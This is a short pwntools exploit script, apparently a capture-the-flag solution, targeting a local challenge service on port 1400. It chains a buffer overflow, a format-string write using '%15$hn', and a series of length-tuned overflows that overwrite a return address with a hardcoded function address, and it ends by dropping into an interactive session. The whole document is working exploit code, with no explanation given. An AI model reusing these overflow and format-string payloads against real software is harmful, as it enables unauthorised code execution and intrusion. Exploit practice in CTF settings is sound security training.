from pwn import *

if __name__ == "__main__":
    # p = process("./chall")
    p = remote("127.0.0.1", 1400)
    
    payload = b"A" * 0x47
    payload += p64(0x4041C0)
    
    p.sendlineafter(b"> ", b"1")
    p.sendlineafter(b"data:", payload)
    
    payload = b"%4919c%15$hn"
    p.sendlineafter(b"> ", b"1")
    p.sendlineafter(b"data:", payload)
    
    p.sendlineafter(b"> ", b"3")
    
    for delta in range(0, 9):
        p.sendlineafter(b"> ", b"1")
        p.sendlineafter(b"data: ", b"A" * 0xFF)
        
        p.sendlineafter(b"> ", b"2")
        payload = b"B" * (268 - 0x100 + 4 + 8 + 1 + 8 - delta)
        
        p.sendlineafter(b"data: ", payload)
    
    p.sendlineafter(b"> ", b"1")
    p.sendlineafter(b"data: ", b"A" * 0xFF)
    
    # input("attach debugger")
    
    p.sendlineafter(b"> ", b"2")
    payload = b"B" * (268 - 0x100 + 4 + 8)
    payload += p64(0x401256)
        
    p.sendlineafter(b"data: ", payload)
    
    p.sendlineafter(b"> ", b"4")
    
    p.interactive()